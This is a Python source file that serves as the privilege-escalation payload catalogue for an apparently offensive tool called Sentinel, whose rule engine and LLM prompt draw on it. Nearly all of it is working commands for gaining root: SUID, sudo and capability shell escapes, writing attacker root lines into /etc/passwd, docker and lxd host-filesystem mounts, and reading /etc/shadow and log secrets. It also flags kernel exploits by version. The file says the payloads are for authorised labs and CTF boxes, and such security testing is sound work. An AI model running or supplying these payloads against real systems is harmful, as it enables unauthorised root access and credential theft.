"""
Privilege-escalation knowledge base.

This is Sentinel's deterministic brain — a curated, GTFOBins-flavoured catalogue
of how specific primitives become root. It powers the rule engine (which needs no
API key) and is also summarised into the LLM prompt as grounding.

Payloads are the well-known, publicly documented ones (GTFOBins, HackTricks).
They target lab machines and CTF boxes you are authorized to attack.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# SUID exploitation. {bin} is replaced with the binary's path.
# A SUID-root copy of these runs the payload with euid 0.
# ---------------------------------------------------------------------------
SUID_PAYLOADS: dict[str, str] = {
    "bash":    "{bin} -p",
    "sh":      "{bin} -p",
    "dash":    "{bin} -p",
    "find":    "{bin} . -exec /bin/sh -p \\; -quit",
    "nmap":    "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse && {bin} --script=/tmp/x.nse",
    "vim":     "{bin} -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
    "vim.basic": "{bin} -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
    "less":    "{bin} /etc/profile\n# then type: !/bin/sh -p",
    "more":    "{bin} /etc/profile\n# then type: !/bin/sh -p",
    "nano":    "{bin} /etc/passwd  # edit to add a root user, or ^R^X reset; sh -p",
    "cp":      "# overwrite /etc/passwd with an attacker root line: {bin} /tmp/passwd /etc/passwd",
    "awk":     "{bin} 'BEGIN {{system(\"/bin/sh -p\")}}'",
    "gawk":    "{bin} 'BEGIN {{system(\"/bin/sh -p\")}}'",
    "perl":    "{bin} -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/sh -p\";'",
    "python":  "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python3": "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python2": "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "ruby":    "{bin} -e 'Process::Sys.setuid(0); exec \"/bin/sh -p\"'",
    "php":     "{bin} -r \"pcntl_exec('/bin/sh', ['-p']);\"",
    "env":     "{bin} /bin/sh -p",
    "tar":     "{bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip":     "{bin} /tmp/x.zip /etc/hosts -T -TT 'sh -p #'",
    "ftp":     "{bin}\n# then: !/bin/sh -p",
    "man":     "{bin} man\n# then type: !/bin/sh -p",
    "vi":      "{bin} -c ':!/bin/sh -p'",
    "ed":      "{bin}\n!/bin/sh -p",
    "sed":     "{bin} -n '1e exec /bin/sh -p' /etc/hosts",
    "tee":     "# append an attacker root line: echo 'r::0:0::/root:/bin/sh' | {bin} -a /etc/passwd",
    "dd":      "# overwrite a root-owned file, e.g. add a passwd line via {bin}",
    "node":    "{bin} -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {{stdio: [0,1,2]}})'",
    "socat":   "{bin} stdin exec:/bin/sh -p",
    "expect":  "{bin} -c 'spawn /bin/sh -p; interact'",
    "wget":    "# write to a sensitive file as root, e.g. overwrite /etc/passwd via {bin} -O",
    "curl":    "# write to a sensitive file as root, e.g. overwrite /etc/passwd via {bin} -o",
}

# ---------------------------------------------------------------------------
# sudo exploitation. Used when a binary is allowed via sudo (esp. NOPASSWD).
# {bin} is replaced with the binary name as it appears in the sudo rule.
# ---------------------------------------------------------------------------
SUDO_PAYLOADS: dict[str, str] = {
    "find":    "sudo {bin} . -exec /bin/sh \\; -quit",
    "vim":     "sudo {bin} -c ':!/bin/sh'",
    "vi":      "sudo {bin} -c ':!/bin/sh'",
    "nano":    "sudo {bin}  # ^R^X then: reset; sh 1>&0 2>&0",
    "less":    "sudo {bin} /etc/profile  # then: !/bin/sh",
    "more":    "sudo {bin} /etc/profile  # then: !/bin/sh",
    "man":     "sudo {bin} man  # then: !/bin/sh",
    "awk":     "sudo {bin} 'BEGIN {{system(\"/bin/sh\")}}'",
    "gawk":    "sudo {bin} 'BEGIN {{system(\"/bin/sh\")}}'",
    "perl":    "sudo {bin} -e 'exec \"/bin/sh\";'",
    "python":  "sudo {bin} -c 'import os; os.system(\"/bin/sh\")'",
    "python3": "sudo {bin} -c 'import os; os.system(\"/bin/sh\")'",
    "ruby":    "sudo {bin} -e 'exec \"/bin/sh\"'",
    "php":     "sudo {bin} -r 'system(\"/bin/sh\");'",
    "env":     "sudo {bin} /bin/sh",
    "tar":     "sudo {bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "ftp":     "sudo {bin}  # then: !/bin/sh",
    "vim.basic": "sudo {bin} -c ':!/bin/sh'",
    "nmap":    "sudo {bin} --interactive  # then: !sh   (old nmap)",
    "bash":    "sudo {bin}",
    "sh":      "sudo {bin}",
    "cp":      "sudo {bin} /tmp/passwd /etc/passwd  # after crafting a root line",
    "tee":     "echo 'r::0:0::/root:/bin/sh' | sudo {bin} -a /etc/passwd",
    "systemctl": "# create a malicious unit and: sudo {bin} link /tmp/x.service; sudo {bin} start x",
    "git":     "sudo {bin} -p help config  # then: !/bin/sh   (pager escape)",
    "docker":  "sudo {bin} run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "apt":     "sudo {bin} update -o APT::Update::Pre-Invoke::='/bin/sh'",
    "apt-get": "sudo {bin} update -o APT::Update::Pre-Invoke::='/bin/sh'",
}

# ---------------------------------------------------------------------------
# File-capability exploitation (getcap). Keyed by binary basename.
# ---------------------------------------------------------------------------
CAP_SETUID_PAYLOADS: dict[str, str] = {
    "python":  "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python3": "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "python2": "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "perl":    "{bin} -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
    "ruby":    "{bin} -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
    "node":    "{bin} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",{{stdio:[0,1,2]}})'",
}

# ---------------------------------------------------------------------------
# Dangerous group memberships -> canonical escalation.
# ---------------------------------------------------------------------------
GROUP_EXPLOITS: dict[str, dict] = {
    "docker": {
        "why": "Members of 'docker' can start containers that mount the host filesystem as root.",
        "cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "ref": "https://gtfobins.github.io/gtfobins/docker/",
    },
    "lxd": {
        "why": "Members of 'lxd'/'lxc' can launch a privileged container mounting the host root.",
        "cmd": "lxc init alpine r -c security.privileged=true && lxc config device add r d disk source=/ path=/mnt && lxc start r && lxc exec r /bin/sh",
        "ref": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation",
    },
    "lxc": {
        "why": "Members of 'lxd'/'lxc' can launch a privileged container mounting the host root.",
        "cmd": "lxc init alpine r -c security.privileged=true && lxc config device add r d disk source=/ path=/mnt && lxc start r && lxc exec r /bin/sh",
        "ref": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation",
    },
    "disk": {
        "why": "Members of 'disk' can read/write raw block devices, e.g. read /etc/shadow via debugfs.",
        "cmd": "debugfs /dev/sda1   # then: cat /etc/shadow  (device name varies)",
        "ref": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe",
    },
    "adm": {
        "why": "Members of 'adm' can read system logs, often revealing credentials or tokens.",
        "cmd": "grep -riE 'pass|secret|token' /var/log 2>/dev/null",
        "ref": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe",
    },
    "shadow": {
        "why": "Members of 'shadow' can read /etc/shadow and crack root's hash offline.",
        "cmd": "cat /etc/shadow   # then crack root's hash with hashcat/john",
        "ref": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation",
    },
}

# ---------------------------------------------------------------------------
# Kernel-exploit heuristics. (kernel_matches, name, cve, ref). Purely advisory —
# always verify the exact kernel/distro before running a kernel exploit.
# ---------------------------------------------------------------------------
KERNEL_HINTS = [
    {
        "name": "DirtyPipe",
        "cve": "CVE-2022-0847",
        "match": lambda v: _dirtypipe_vulnerable(v),
        "note": "Linux 5.8+ (fixed in 5.16.11 / 5.15.25 / 5.10.102): arbitrary "
                "write to read-only files via pipe splicing.",
        "ref": "https://dirtypipe.cm4all.com/",
    },
    {
        "name": "PwnKit (polkit pkexec)",
        "cve": "CVE-2021-4034",
        "match": lambda v: True,   # pkexec bug is kernel-independent; flag broadly
        "note": "pkexec local root — affects most distros with polkit before Jan 2022. Verify pkexec is SUID.",
        "ref": "https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt",
    },
    {
        "name": "DirtyCow",
        "cve": "CVE-2016-5195",
        "match": lambda v: _ver_less(v, (4, 8, 3)),
        "note": "Linux < 4.8.3: race in copy-on-write allows overwriting read-only memory.",
        "ref": "https://dirtycow.ninja/",
    },
]


def _parse_kernel(v: str) -> tuple[int, int, int]:
    nums = []
    for part in v.split("-")[0].split("."):
        try:
            nums.append(int(part))
        except ValueError:
            break
    while len(nums) < 3:
        nums.append(0)
    return tuple(nums[:3])  # type: ignore[return-value]


def _ver_less(v: str, hi: tuple[int, int, int]) -> bool:
    return _parse_kernel(v) < hi


def _ver_between(v: str, lo: tuple[int, int, int], hi: tuple[int, int, int]) -> bool:
    return lo <= _parse_kernel(v) <= hi


# DirtyPipe (CVE-2022-0847) was introduced in 5.8 and fixed in the stable
# backports 5.16.11, 5.15.25 and 5.10.102. A point release at or above its
# series' fix is patched, so a single 5.8–5.16.11 range wrongly flags kernels
# like 5.15.30 or 5.10.150 as vulnerable.
_DIRTYPIPE_FIXED: dict[tuple[int, int], tuple[int, int, int]] = {
    (5, 16): (5, 16, 11),
    (5, 15): (5, 15, 25),
    (5, 10): (5, 10, 102),
}


def _dirtypipe_vulnerable(v: str) -> bool:
    ver = _parse_kernel(v)
    if ver < (5, 8, 0) or ver > (5, 16, 11):
        return False
    fixed = _DIRTYPIPE_FIXED.get(ver[:2])
    if fixed is not None:
        return ver < fixed
    return True


def basename(path: str) -> str:
    return path.rsplit("/", 1)[-1]
